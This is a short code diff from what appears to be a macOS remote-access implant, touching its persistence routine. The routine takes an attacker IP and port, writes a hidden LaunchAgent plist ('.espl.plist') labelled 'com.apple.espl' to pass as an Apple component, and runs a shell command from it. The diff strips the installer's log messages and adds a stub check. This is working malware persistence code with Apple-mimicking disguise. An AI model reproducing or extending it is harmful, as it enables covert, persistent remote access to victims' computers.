@@ -659,7 +659,6 @@ char* parseBinary(int* searchChars, int sizeOfSearch) {
 - (void)persistence:(NSString*)args withIP:(NSString*)ip andPort:(int)port {
     NSString* esplPath = @"/Library/LaunchAgents/.espl.plist";
     if ([args isEqualToString:@"install"]) {
-        NSLog(@"[- PERSISTENCE -] Starting installation process...");
         NSDictionary* innerDict = [NSDictionary dictionaryWithObjects: 
             [NSArray arrayWithObjects:[NSNumber numberWithBool:YES], @"com.apple.espl", [NSNumber numberWithInt:5], [NSNumber numberWithBool:YES],
                 [NSArray arrayWithObjects:@"sh", @"-c",
@@ -688,7 +687,6 @@ char* parseBinary(int* searchChars, int sizeOfSearch) {
             @"/Library/LaunchAgents/.espl.plist 2>/dev/null;"
         sendTerminal:false];
     } else if ([args isEqualToString:@"uninstall"]) {
-        NSLog(@"[- PERSISTENCE -] Starting uninstallation process...");
         if ([self.fileManager fileExistsAtPath:esplPath]) {
             [self runTask:@"launchctl unload /Library/LaunchAgents/.espl.plist "
                 @"2>/dev/null; rm "
@@ -696,7 +694,9 @@ char* parseBinary(int* searchChars, int sizeOfSearch) {
             sendTerminal:false];
         }
     } else if ([args isEqualToString:@"check"]) {
-
+        if ([self.fileManager fileExistsAtPath:esplPath]) {
+            // TODO
+        }
     } else {
         [self sendString:@"Unknown Option"];
     }
